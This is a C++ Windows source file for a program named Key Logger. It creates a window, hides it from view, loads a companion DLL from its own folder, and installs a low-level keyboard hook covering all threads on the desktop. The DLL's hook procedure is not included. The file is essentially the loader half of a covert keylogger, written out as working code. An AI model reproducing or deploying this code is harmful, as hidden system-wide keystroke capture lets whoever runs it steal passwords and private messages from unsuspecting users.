// KeyLogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "KeyLoggerInterface.h"
#include <Windows.h>
#include <iostream>
#include <string>
#include <PathCch.h>

#pragma comment(lib, "PathCch.lib")

HINSTANCE hInst;
static TCHAR szWindowClass[] = _T("Key Logger");
static TCHAR szTitle[] = _T("Key Logger");

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void start();
std::wstring currentDirectory();
std::wstring exeDirectory();

int WINAPI WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_APPLICATION));
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_APPLICATION));

	if (!RegisterClassEx(&wcex))
	{
		MessageBox(NULL,
			_T("Call to RegisterClassEx failed!"),
			_T("Key Logger"),
			NULL);

		return 1;
	}

	hInst = hInstance; // Store instance handle in our global variable  

					   // The parameters to CreateWindow explained:  
					   // szWindowClass: the name of the application  
					   // szTitle: the text that appears in the title bar  
					   // WS_OVERLAPPEDWINDOW: the type of window to create  
					   // CW_USEDEFAULT, CW_USEDEFAULT: initial position (x, y)  
					   // 500, 100: initial size (width, length)  
					   // NULL: the parent of this window  
					   // NULL: this application dows not have a menu bar  
					   // hInstance: the first parameter from WinMain  
					   // NULL: not used in this application  
	HWND hWnd = CreateWindow(
		szWindowClass,
		szTitle,
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT,
		500, 100,
		NULL,
		NULL,
		hInstance,
		NULL
		);

	if (!hWnd)
	{
		MessageBox(NULL,
			_T("Call to CreateWindow failed!"),
			_T("Key Logger"),
			NULL);

		return 1;
	}

	// The parameters to ShowWindow explained:  
	// hWnd: the value returned from CreateWindow  
	// nCmdShow: the fourth parameter from WinMain  
	ShowWindow(hWnd,
		SW_HIDE);
	UpdateWindow(hWnd);

	// Main message loop:  
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return (int)msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	PAINTSTRUCT ps;
	HDC hdc;
	TCHAR greeting[] = _T("Hello, World!");

	switch (message)
	{
	case WM_CREATE:
	{
		start();
	}
	break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);

		// Here your application is laid out.  
		// For this introduction, we just print out "Hello, World!"  
		// in the top left corner.  
		TextOut(hdc,
			5, 5,
			greeting, _tcslen(greeting));
		// End application specific layout section.  

		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
		break;
	}

	return 0;
}

void start()
{
	std::wstring exeDir = exeDirectory();
	std::wstring dllPath = exeDir + L"\\KeyLoggerDLL.dll"; // DLL in same directory as exe
	HMODULE hhookDLL = LoadLibrary(dllPath.c_str());
	HOOKPROC hkprc = (HOOKPROC)GetProcAddress(hhookDLL, "_KeyboardHookProc@12");

	if (!hkprc)
	{
		std::cout << "Hook initialization failed! Error: " << GetLastError() << std::endl;
	}
	DWORD dwThreadId = 0; // if this parameter is zero then the hook is associated with all threads on the desktop
	HHOOK hhook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		hkprc,
		hhookDLL,
		dwThreadId);

	if (!hhook)
	{
		std::cout << "Hook initialization failed! Error: " << GetLastError() << std::endl;
	}
	else
	{
		std::cout << "Starting KEY LOGGER" << std::endl;
	}
}

std::wstring currentDirectory()
{
	TCHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);
	std::wstring path = &NPath[0];
	return path;
}

std::wstring exeDirectory()
{
	wchar_t buffer[MAX_PATH]; 
	GetModuleFileName(NULL, buffer, MAX_PATH);
	PathCchRemoveFileSpec(buffer, MAX_PATH);
	std::wstring path = buffer;
	return path;
}

